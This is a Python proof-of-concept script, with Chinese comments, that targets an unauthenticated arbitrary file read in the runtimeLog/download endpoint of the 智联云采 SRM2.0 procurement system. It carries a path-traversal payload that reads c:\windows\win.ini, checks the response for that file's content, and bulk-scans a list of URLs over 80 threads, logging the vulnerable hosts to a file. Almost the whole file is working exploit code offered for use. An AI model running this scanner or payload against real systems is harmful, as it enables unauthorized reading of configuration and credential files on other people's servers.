# -*- coding: utf-8 -*-
# 智联云采 SRM2.0 runtimeLog/download 任意文件读取漏洞
# title=="SRM 2.0"
# 产品简介：智联云采是一款针对企业供应链管理难题及智能化转型升级需求而设计的解决方案，针对企业供应链管理难题，及智能化转型升级需求，智联云采依托人工智能、物联网、大数据、云等技术，通过软硬件系统化方案，帮助企业实现供应商关系管理和采购线上化、移动化、智能化，提升采购和协同效率，进而规避供需风险，强化供应链整合能力，构建企业利益共同体。
# 漏洞概述：智联云采 SRM2.0 runtimeLog/download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
            \x1b[38m███████╗██╗  ██╗   ██╗ ██████╗     ███████╗██████╗ ███╗   ███╗
            \x1b[36m╚══███╔╝██║  ╚██╗ ██╔╝██╔════╝     ██╔════╝██╔══██╗████╗ ████║
            \x1b[34m  ███╔╝ ██║   ╚████╔╝ ██║    █████╗███████╗██████╔╝██╔████╔██║
            \x1b[35m ███╔╝  ██║    ╚██╔╝  ██║    ╚════╝╚════██║██╔══██╗██║╚██╔╝██║
            \x1b[31m███████╗███████╗██║   ╚██████╗     ███████║██║  ██║██║ ╚═╝ ██║
            \x1b[33m╚══════╝╚══════╝╚═╝    ╚═════╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:智联云采 SRM2.0 runtimeLog/download 任意文件读取漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('智联云采 SRM2.0 runtimeLog/download 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',

    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and '; for 16-bit app support' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('智联云采-SRM2.0_任意文件读取漏洞.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print(f"[-]{target} 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()